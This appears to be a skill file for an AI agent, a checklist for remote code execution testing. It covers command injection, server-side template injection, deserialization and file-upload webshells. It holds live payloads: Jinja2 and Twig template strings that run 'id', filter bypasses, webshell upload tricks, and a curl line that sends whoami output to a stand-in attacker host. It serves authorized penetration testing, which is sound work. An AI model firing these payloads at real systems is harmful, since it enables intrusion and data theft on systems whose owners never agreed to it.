# SKILL: Remote Code Execution Testing

## Description
RCE testing checklist adapted from Claude-Red / SnailSploit.

## Trigger Phrases
rce, remote code execution, command injection, os injection

## Methodology

### OS Command Injection
1. Identify user input reaching system commands
2. Test separators: `;`, `|`, `||`, `&&`, `\n`, `` ` ``
3. Blind detection: `; sleep 5`, `| ping -c 5 <attacker>`
4. Out-of-band: `; curl http://<attacker>/$(whoami)`
5. Bypass filters: `${IFS}`, `$()`, `\x0a`, encoding

### SSTI to RCE
1. Test template markers: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
2. Jinja2: `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
3. Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`

### Deserialization RCE
1. Java: ysoserial → CommonsCollections, Spring gadgets
2. PHP: unserialize + POP chains
3. Python: pickle → `__reduce__` method
4. .NET: ysoserial.net, TypeNameHandling

### File Upload to RCE
1. Upload webshell: bypass extension filters (.pHp, .php5, .phtml)
2. Content-Type manipulation
3. Double extension: shell.php.jpg
4. Polyglot files: valid image + valid PHP
